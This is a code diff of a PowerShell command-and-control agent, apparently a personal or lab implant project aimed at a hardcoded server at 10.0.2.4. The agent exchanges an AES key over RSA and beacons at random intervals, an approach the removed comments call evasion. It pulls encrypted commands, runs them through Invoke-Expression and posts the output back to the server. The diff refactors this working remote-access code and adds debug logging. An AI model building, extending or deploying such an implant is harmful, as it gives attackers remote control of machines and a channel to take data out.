@@ -22,40 +22,57 @@ Function Load-AgentID {
     }
 }
 
-# Function to encrypt using AES-GCM
+# AES-GCM Encryption function
 Function Encrypt-Result-GCM {
     Param ([string]$PlainText, [byte[]]$AESKey)
 
-    $Nonce = New-Object byte[] 12  # 96-bit Nonce
-    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($Nonce)
+    # Validate AES Key Length
+    If ($AESKey.Length -ne 32) {
+        Throw "AES Key must be 32 bytes!"
+    }
 
-    $AEAD = New-Object System.Security.Cryptography.AesGcm($AESKey)
+    $Nonce = New-Object byte[] 12  # 96-bit Nonce
+    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($Nonce)
+
+    $AEAD = [System.Security.Cryptography.AesGcm]::new($AESKey)
     $PlainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
     $CipherText = New-Object byte[] $PlainTextBytes.Length
     $Tag = New-Object byte[] 16  # 128-bit authentication tag
 
     $AEAD.Encrypt($Nonce, $PlainTextBytes, $CipherText, $Tag)
-
     return [Convert]::ToBase64String($Nonce + $CipherText + $Tag)
 }
 
-# Function to decrypt using AES-GCM
-Function Decrypt-Result-GCM {
-    Param ([string]$CipherTextBase64, [byte[]]$AESKey)
+# AES-GCM Decryption function with detailed debug statements
+Function Decrypt-Data {
+    Param ([byte[]]$Data, [byte[]]$AESKey)
 
-    $CipherData = [Convert]::FromBase64String($CipherTextBase64)
-    $Nonce = $CipherData[0..11]  # First 12 bytes
-    $CipherText = $CipherData[12..($CipherData.Length-17)]  # Middle part
-    $Tag = $CipherData[($CipherData.Length-16)..($CipherData.Length-1)]  # Last 16 bytes
-
-    $AEAD = New-Object System.Security.Cryptography.AesGcm($AESKey)
-    $PlainTextBytes = New-Object byte[] $CipherText.Length
+    If ($AESKey.Length -ne 32) {
+        Throw "AES Key must be 32 bytes!"
+    }
 
     Try {
+        $Nonce = $Data[0..11]
+        $CipherText = $Data[12..($Data.Length-17)]
+        $Tag = $Data[($Data.Length-16)..($Data.Length-1)]
+
+        Write-Host "[DEBUG] Nonce (Base64): $([Convert]::ToBase64String($Nonce))"
+        Write-Host "[DEBUG] CipherText (Base64): $([Convert]::ToBase64String($CipherText))"
+        Write-Host "[DEBUG] Tag (Base64): $([Convert]::ToBase64String($Tag))"
+        Write-Host "[DEBUG] AES Key (Base64): $([Convert]::ToBase64String($AESKey))"
+
+        $AEAD = [System.Security.Cryptography.AesGcm]::new($AESKey)
+        $PlainTextBytes = New-Object byte[] $CipherText.Length
+
         $AEAD.Decrypt($Nonce, $CipherText, $Tag, $PlainTextBytes)
-        return [System.Text.Encoding]::UTF8.GetString($PlainTextBytes)
-    } Catch {
-        Write-Host "[-] Decryption failed: Integrity check failed!"
+        $DecryptedText = [System.Text.Encoding]::UTF8.GetString($PlainTextBytes)
+
+        Write-Host "Decryption successful: $DecryptedText"
+        return $DecryptedText
+    }
+    Catch {
+        Write-Host "Decryption Error: $_"
+        $_ | Out-File -FilePath "C:\Temp\decryption_error.log" -Append
         return $null
     }
 }
@@ -66,39 +83,72 @@ Function Send-Beacon {
 
     Try {
         $Body = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
-        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
-
-        Write-Host "[*] Sending beacon..."
-        $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
+        $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($Body)) -ContentType "application/json; charset=utf-8"
+        
         $EncryptedCommand = $Response.data
+        Write-Host "Encrypted command received: $EncryptedCommand"
 
-        $Command = Decrypt-Result-GCM -CipherTextBase64 $EncryptedCommand -AESKey $AESKey
-
-        If ($Command -ne "NoCommand") {
-            Write-Host "[*] Executing command: $Command"
-            $Result = Invoke-Expression $Command | Out-String
-            $Result = $Result -replace "`r`n", "`n"
-            Send-Result -AgentID $AgentID -C2Url $C2Url -Result $Result -AESKey $AESKey
-        }
-    } Catch {
+        Execute-Command -ServerURL $C2Url -AgentID $AgentID -Key $AESKey -Command $EncryptedCommand
+    }
+    Catch {
+        Write-Host "Error in Send-Beacon: $_"
         $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
     }
 }
 
 # Function to send execution result
 Function Send-Result {
-    Param ([string]$AgentID, [string]$C2Url, [string]$Result, [byte[]]$AESKey)
+    Param (
+        [string]$ServerURL,
+        [string]$AgentID,
+        [string]$Result,
+        [byte[]]$AESKey
+    )
 
     Try {
         $EncryptedResult = Encrypt-Result-GCM -PlainText $Result -AESKey $AESKey
         $Body = @{ AgentID = $AgentID; Result = $EncryptedResult } | ConvertTo-Json -Compress
-        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
 
-        Write-Host "[*] Sending result..."
-        Invoke-RestMethod -Uri "$C2Url/result" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
-    } Catch {
+        Invoke-RestMethod -Uri "$ServerURL/result" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($Body)) -ContentType "application/json; charset=utf-8"
+    }
+    Catch {
+        Write-Host "Error in Send-Result: $_"
         $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
     }
+}
+
+# Function to execute command
+Function Execute-Command {
+    Param (
+        [string]$ServerURL,
+        [string]$AgentID,
+        [byte[]]$AESKey,
+        [string]$Command
+    )
+    Try {
+        Log-Message "Decrypting command..."
+        $DecryptedCommand = Decrypt-Data -Data ([Convert]::FromBase64String($Command)) -AESKey $AESKey
+        Log-Message "Decrypted Command: $DecryptedCommand"
+        If ($DecryptedCommand -ne "NoCommand") {
+            Log-Message "Executing command: $DecryptedCommand"
+            # Execute PowerShell command directly and convert the result to a string
+            $Result = Invoke-Expression -Command $DecryptedCommand | Out-String
+            Log-Message "Command execution result: $Result"
+            Log-Message "Sending result..."
+            Send-Result -ServerURL $ServerURL -AgentID $AgentID -Result $Result -AESKey $AESKey
+        } Else {
+            Log-Message "No commands to execute."
+        }
+    } Catch {
+        Log-Message "Error in Execute-Command: $_"
+    }
+}
+
+# Function to log messages
+Function Log-Message {
+    Param ([string]$Message)
+    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$Timestamp - $Message" | Out-File -FilePath "C:\Temp\powershell_execution.log" -Append
 }
 
 # Function to import RSA key
@@ -106,61 +156,38 @@ Function Import-RSAKey {
     Param ([string]$PublicKeyXML)
     $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
     $rsa.FromXmlString($PublicKeyXML)
-    return $rsa
+    Return $rsa
 }
 
-# Main execution
+# Main Execution
 Try {
     $AgentIDFilePath = "C:\Temp\agent_id.txt"
     $AgentID = Load-AgentID -FilePath $AgentIDFilePath
-    $C2Url = "http://10.0.2.4:8000"  # Hardcoded for testing. Replace with config loading if needed.
+    $C2Url = "http://10.0.2.4:8080"
 
-    Write-Host "[*] Fetching Public Key..."
     $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
-    If (-Not $PublicKeyResponse.PublicKey) { Throw "[-] Failed to retrieve public key" }
-    $PublicKeyXML = $PublicKeyResponse.PublicKey
+    $RSA = Import-RSAKey -PublicKeyXML $PublicKeyResponse.PublicKey
 
-    $RSA = Import-RSAKey -PublicKeyXML $PublicKeyXML
-
-    # Generate AES Key
     $AESKey = New-Object byte[] 32
-    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
-    $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
+    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
     
-    # Encrypt AES Key with RSA using OAEP
     $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
-    $EncryptedAESKeyBase64 = [Convert]::ToBase64String($EncryptedAESKey)
-    
-    $Body = @{ AgentID = $AgentID; EncAESKey = $EncryptedAESKeyBase64 } | ConvertTo-Json -Compress
-    $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
+    $Body = @{ AgentID = $AgentID; EncAESKey = [Convert]::ToBase64String($EncryptedAESKey) } | ConvertTo-Json -Compress
 
-    Write-Host "[*] Sending encrypted AES key..."
-    $Response = Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
-    If ($Response.Status -ne "Success") { Throw "[-] Key exchange failed." }
+    Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($Body)) -ContentType "application/json; charset=utf-8"
 
-    # Check-in
     $CheckinBody = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
-    $CheckinBody = [System.Text.Encoding]::UTF8.GetBytes($CheckinBody)
-    Invoke-RestMethod -Uri "$C2Url/checkin" -Method POST -Body $CheckinBody -ContentType "application/json; charset=utf-8"
-    
-    Write-Host "[*] Agent check-in completed."
+    Invoke-RestMethod -Uri "$C2Url/checkin" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($CheckinBody)) -ContentType "application/json; charset=utf-8"
 
-    # Time-based evasion
-    $SleepTime = Get-Random -Minimum 10 -Maximum 60
-    Write-Host "[*] Sleeping for $SleepTime seconds before starting beacon loop."
-    Start-Sleep -Seconds $SleepTime
+    Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)
 
     While ($true) {
-        Try {
-            Send-Beacon -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
-        } Catch {
-            $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
-        }
-        $DynamicSleep = Get-Random -Minimum 10 -Maximum 30
-        Start-Sleep -Seconds $DynamicSleep
+        Send-Beacon -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
+        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
     }
 }
 Catch {
+    Write-Host "Error in main execution: $_"
     $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
     Start-Sleep -Seconds 10
 }
